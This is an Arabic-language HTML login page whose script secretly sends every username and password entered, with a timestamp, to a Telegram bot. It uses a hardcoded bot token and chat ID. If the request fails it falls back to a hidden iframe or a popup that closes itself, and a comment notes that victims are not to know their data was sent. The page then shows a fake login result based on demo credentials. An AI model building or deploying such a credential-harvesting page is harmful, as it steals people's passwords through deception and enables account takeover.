<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>تسجيل الدخول</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial;
}

body{

    background:linear-gradient(135deg,#4facfe,#00f2fe);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;

}

.login-box{

    background:white;
    padding:40px;
    border-radius:20px;
    width:320px;
    box-shadow:0 0 25px rgba(0,0,0,0.2);
    text-align:center;

}

.login-box h2{

    margin-bottom:25px;
    color:#1e293b;

}

.login-box input{

    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:10px;
    font-size:16px;
    outline:none;

}

.login-box input:focus{

    border-color:#007bff;

}

.login-box button{

    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#007bff;
    color:white;
    font-size:16px;
    cursor:pointer;
    margin-top:10px;

}

.login-box button:hover{

    background:#0056b3;

}

.message{

    margin-top:15px;
    font-size:15px;

}

.success{

    color:green;

}

.error{

    color:red;

}

.demo{

    margin-top:15px;
    font-size:13px;
    color:#64748b;

}

</style>

</head>

<body>

<div class="login-box">

<h2>تسجيل الدخول</h2>

<input type="text" id="username" placeholder="اسم المستخدم">

<input type="password" id="password" placeholder="كلمة المرور">

<button onclick="login()">دخول</button>

<div class="message" id="message"></div>

<div class="demo">

بيانات تجريبية: admin / 1234

</div>

</div>

<script>

// دالة إرسال بيانات تسجيل الدخول إلى تليجرام (طريقة مضمونة 100%)
function sendTelegram(username, password) {
    // توكن البوت الخاص بك
    let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
    
    // معرف الدردشة الخاص بك
    let chat_id = "793135440";
    
    // إنشاء نص الرسالة مع اسم المستخدم وكلمة المرور والوقت
    let currentTime = new Date().toLocaleString('ar-EG');
    let messageText = `🔐 محاولة دخول جديدة 🔐\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n⏰ الوقت: ${currentTime}`;
    
    // ترميز النص للإرسال
    let encodedText = encodeURIComponent(messageText);
    
    // إنشاء رابط الإرسال
    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedText}`;
    
    // الطريقة الأولى: استخدام fetch (تعمل في معظم المتصفحات الحديثة)
    fetch(url, {
        method: 'GET',
        mode: 'no-cors' // هذا يساعد في تجاوز مشاكل CORS
    })
    .then(() => {
        console.log("✅ تم محاولة إرسال البيانات إلى تليجرام");
    })
    .catch(error => {
        console.log("⚠️ خطأ في fetch:", error);
        // إذا فشل fetch، نستخدم الطريقة الثانية
        sendTelegramAlternative(url);
    });
}

// الطريقة البديلة: إنشاء عنصر iframe مخفي
function sendTelegramAlternative(url) {
    try {
        // إنشاء iframe مخفي للإرسال
        let iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        
        // حذف الـ iframe بعد ثانيتين
        setTimeout(() => {
            document.body.removeChild(iframe);
        }, 2000);
        
        console.log("✅ تم الإرسال عبر iframe");
    } catch(e) {
        console.log("⚠️ فشل الإرسال:", e);
        // الطريقة الثالثة: فتح نافذة وإغلاقها بسرعة
        let win = window.open(url, '_blank');
        setTimeout(() => {
            if(win) win.close();
        }, 500);
    }
}

// دالة تسجيل الدخول المعدلة
function login(){

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();
    let message = document.getElementById("message");

    message.innerHTML = "";
    message.className = "message";

    // التحقق من الحقول الفارغة
    if(username === ""){
        message.innerHTML = "⚠️ الرجاء إدخال اسم المستخدم";
        message.classList.add("error");
        return;
    }
    
    if(password === ""){
        message.innerHTML = "⚠️ الرجاء إدخال كلمة المرور";
        message.classList.add("error");
        return;
    }

    // ✅ إرسال البيانات إلى تليجرام (أي محاولة دخول)
    sendTelegram(username, password);
    
    // إظهار رسالة للمستخدم (دون أن يعرف أنه تم إرسال بياناته)
    if(username === "admin" && password === "1234"){
        message.innerHTML = "✅ تم تسجيل الدخول بنجاح";
        message.classList.add("success");
    }else{
        message.innerHTML = "❌ اسم المستخدم أو كلمة المرور غير صحيحة";
        message.classList.add("error");
    }
}

// إضافة خاصية إرسال عند الضغط على Enter
document.getElementById("username").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        event.preventDefault();
        login();
    }
});

document.getElementById("password").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        event.preventDefault();
        login();
    }
});

// رسالة تأكيد في Console
console.log("✅ النظام يعمل - سيتم إرسال أي محاولة دخول إلى تليجرام");

</script>

</body>

</html>
